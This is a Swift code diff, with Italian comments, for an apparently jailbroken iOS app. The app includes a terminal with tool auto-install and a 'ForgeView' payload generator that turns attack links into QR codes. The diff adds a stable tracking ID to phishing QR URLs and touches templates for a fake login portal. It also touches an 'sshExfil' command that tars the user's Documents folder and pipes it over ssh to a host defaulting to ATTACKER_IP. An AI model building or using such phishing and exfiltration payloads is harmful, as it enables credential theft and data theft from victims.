@@ -28,7 +28,13 @@ final class TerminalModel: ObservableObject {
                     self.running = false
                     if ok {
                         self.append("'\(toolName)' installato — rieseguo", .good)
-                        self.run(cmd)
+                        // guardia anti-loop: se il binario non è risolvibile, non re-entrare in install
+                        if ShellRunner.shared.resolve(String(head)) != nil {
+                            self.run(cmd)
+                        } else {
+                            self.append("install ok ma '\(head)' non risolvibile nel PATH — ridigita", .bad)
+                            Haptics.fail()
+                        }
                     } else {
                         self.append("auto-install fallita per '\(toolName)' — Sileo aperto, installa lì e riprova", .bad)
                         Haptics.fail()
@@ -423,6 +429,8 @@ struct ForgeView: View {
     @State private var path = "/login"
     @State private var qrVal = ""
     @State private var copied = false
+    // sid STABILE nel payload (UUID nel body cambierebbe a ogni render: link copiato ≠ mostrato)
+    @State private var trackSid = UUID().uuidString.prefix(8).description
 
     private var payload: String {
         let h = host.isEmpty ? "ATTACKER_IP" : host
@@ -439,8 +447,7 @@ struct ForgeView: View {
         case .portal:
             return "http://\(h):\(p)\(path.isEmpty ? "/login" : path)"
         case .phish:
-            let track = UUID().uuidString.prefix(8)
-            return "https://\(h)\(path.isEmpty ? "/session" : path)?src=qr&sid=\(track)"
+            return "https://\(h)\(path.isEmpty ? "/session" : path)?src=qr&sid=\(trackSid)"
         case .sshExfil:
             return "tar czf - /var/mobile/Documents 2>/dev/null | ssh \(h) 'cat > /tmp/exfil-\(Int(Date().timeIntervalSince1970)).tar.gz'"
         case .webhook:
@@ -611,6 +618,8 @@ struct ForgeView: View {
 }
 
 enum QRCodec {
+    static let ctx = CIContext()
+
     static func image(_ s: String) -> UIImage? {
         let data = Data(s.utf8)
         guard let filter = CIFilter(name: "CIQRCodeGenerator") else { return nil }
@@ -618,7 +627,7 @@ enum QRCodec {
         filter.setValue("H", forKey: "inputCorrectionLevel")
         guard let out = filter.outputImage else { return nil }
         let scaled = out.transformed(by: CGAffineTransform(scaleX: 12, y: 12))
-        guard let cg = CIContext().createCGImage(scaled, from: scaled.extent) else { return nil }
+        guard let cg = ctx.createCGImage(scaled, from: scaled.extent) else { return nil }
         return UIImage(cgImage: cg)
     }
 }
